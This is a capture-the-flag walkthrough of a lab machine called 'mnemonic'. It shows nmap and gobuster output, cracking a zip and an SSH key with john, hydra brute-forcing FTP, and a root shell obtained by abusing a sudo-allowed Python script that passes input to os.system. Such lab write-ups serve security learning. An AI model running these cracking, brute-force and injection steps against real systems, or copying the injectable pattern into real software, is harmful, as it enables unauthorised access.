Port scan
```bash
nmap -p- --min-rate=5000 10.10.63.117
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-02 22:11 EEST
Nmap scan report for 10.10.63.117
Host is up (0.23s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
1337/tcp open  waste

Nmap done: 1 IP address (1 host up) scanned in 16.30 seconds
                                                                                                    
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -p 21,80,1337 -sC -sV  10.10.63.117
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-02 22:12 EEST
Nmap scan report for 10.10.63.117
Host is up (0.32s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/webmasters/*
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
1337/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e0:42:c0:a5:7d:42:6f:00:22:f8:c7:54:aa:35:b9:dc (RSA)
|   256 23:eb:a9:9b:45:26:9c:a2:13:ab:c1:ce:07:2b:98:e0 (ECDSA)
|_  256 35:8f:cb:e2:0d:11:2c:0b:63:f2:bc:a0:34:f3:dc:49 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.28 seconds

```
Ok so we have ftp, a website and ssh. 

I did some directory enumeration with gobuster

I found a login panel in http://10.10.63.117/webmasters/admin/admin.html


I also found /webmasters/backups

One of the questions asked for a secret message so i decided to gobuster the backups directory with all types of extensions.

```bash
gobuster dir -w /usr/share/wordlists/dirb/big.txt  -u http://10.10.63.117/webmasters/backups -t 300 -x php,html,txt,png,jpg,zip
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.63.117/webmasters/backups
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              jpg,zip,php,html,txt,png
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd.png        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htpasswd.zip        (Status: 403) [Size: 277]
/.htaccess.zip        (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htpasswd.jpg        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htaccess.jpg        (Status: 403) [Size: 277]
/.htaccess.png        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/backups.zip          (Status: 200) [Size: 409]
```


I downloaded the zip and it had a password which i easily cracked with zip2john

```bash
                                                                                                                  
┌──(kali㉿kali)-[~/Downloads]
└─$ zip2john backups.zip > hash
ver 1.0 backups.zip/backups/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backups.zip/backups/note.txt PKZIP Encr: TS_chk, cmplen=67, decmplen=60, crc=AEE718A8 ts=24E2 cs=24e2 type=8
                                                                                                                  
┌──(kali㉿kali)-[~/Downloads]
└─$ cat hash 
backups.zip/backups/note.txt:$pkzip$1*1*2*0*43*3c*aee718a8*42*4a*8*43*24e2*2918f93964f9ffa39d4a5fc0d589cae4222fd228a12bc6459bf7b383bdc3cd74557af7a16783ba3217388d2db639162dcee0456f5264bb1839b0f63a28de19581bda79*$/pkzip$:backups/note.txt:backups.zip::backups.zip
                                                                                                                  
┌──(kali㉿kali)-[~/Downloads]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash   
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
00385007         (backups.zip/backups/note.txt)     
1g 0:00:00:00 DONE (2025-09-02 22:36) 1.098g/s 15681Kp/s 15681Kc/s 15681KC/s 0066365..001905apekto
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

The note revealed credentials for the ftp

```bash
└─$ cat note.txt 
@vill

James new ftp username: ftpuser
we have to work hard
```

We were only given the username so i decided to bruteforce for the password with hydra.

```bash
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://10.10.63.117
s[21][ftp] host: 10.10.63.117   login: ftpuser   password: love4ever
```

I tried logging in but there was also a passphrase on the ssh had to crack it also

```bash
┌──(kali㉿kali)-[~/Downloads/backups]
└─$ ssh james@10.10.63.117 -p 1337 -i id_rsa 
Enter passphrase for key 'id_rsa': 

                                                                                                                  
┌──(kali㉿kali)-[~/Downloads/backups]
└─$ ssh2john id_rsa > hash                               
                                                                                                                  
┌──(kali㉿kali)-[~/Downloads/backups]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bluelove         (id_rsa)     
1g 0:00:00:00 DONE (2025-09-02 22:50) 100.0g/s 2793Kp/s 2793Kc/s 2793KC/s chooch..baller15
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
There was also an ssh password and i was quite worried I had to bruteforce it again but it thankfully had the same pass as the id_rsa


There was a list of which seemed like passwords. 

```bash
james@mnemonic:~$ cat 6450.txt
5140656
354528
842004
1617534
465318
1617534
509634
1152216
753372
265896
265896
15355494
24617538
3567438
15355494
james@mnemonic:~$ ls
6450.txt  noteforjames.txt
james@mnemonic:~$ cat noteforjames.txt
noteforjames.txt

@vill

james i found a new encryption İmage based name is Mnemonic  

I created the condor password. don't forget the beers on saturday
```


Then I was stuck for a while since i was not allowed to change directories or anything but then I just tried the find command and i was able to get a base64 string of something

```bash
echo "aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==" | base64 -d
https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpg
```

Here I was so lost since i had 0 clues and i had tried everything and i decided to look for help from forums.


Apparenly the mnemonic is a encryption of some sort and we need to use it to decrypt the image we had downloaded from the base64 decoded message

But I then installed that github repository that included the encryptot but it had modules that i couldn't download since I'm using kali so i had to create and enviroment for it to be able to run

I came to a conclusion that since the machine is so old that it's pretty much broken. I just had to get the password from forums which is quite sad but theres nothing i coulda done




```bash
 ssh condor@10.10.63.117 -p 1337         
condor@10.10.63.117's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Sep  2 20:49:57 UTC 2025

  System load:  0.0                Processes:           104
  Usage of /:   34.5% of 12.01GB   Users logged in:     0
  Memory usage: 46%                IP address for ens5: 10.10.63.117
  Swap usage:   0%

  => There is 1 zombie process.


51 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jul 14 17:58:10 2020 from 192.168.1.6
condor@mnemonic:~$ 
```

We are able to run a self made python script as sudo

```bash
Matching Defaults entries for condor on mnemonic:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User condor may run the following commands on mnemonic:
    (ALL : ALL) /usr/bin/python3 /bin/examplecode.py
```

Its basically a script that allows us to run different things like show operating system etc. Tlere is also a command that shuts down the entire machine and i learnt that the hard way.


```bash
  if select == 0: 
   time.sleep(1)
   ex = str(input("are you sure you want to quit ? yes : "))

   if ex == ".":
    print(os.system(input("\nRunning....")))
   if ex == "yes " or "y":
    sys.exit()
                      
```

Here in the if you answe a dot into the are you sure you want to quit it prints out "running" But its still marked as an input. If we run the code as superuser and create a shell with /bin/bash when its doing that running thing we can get a shell as root

```bash
 £Network Connections   [1]

 £Show İfconfig         [2]

 £Show ip route         [3]

 £Show Os-release       [4]

        £Root Shell Spawn      [5]           

        £Print date            [6]

 £Exit                  [0]



Select:0
are you sure you want to quit ? yes : .

Running..../bin/bash
root@mnemonic:/bin£ 
```

It worked. Not sure why anyone would code it to keep running and take input after inputting a "dot". Well i don't care I rooted the machine
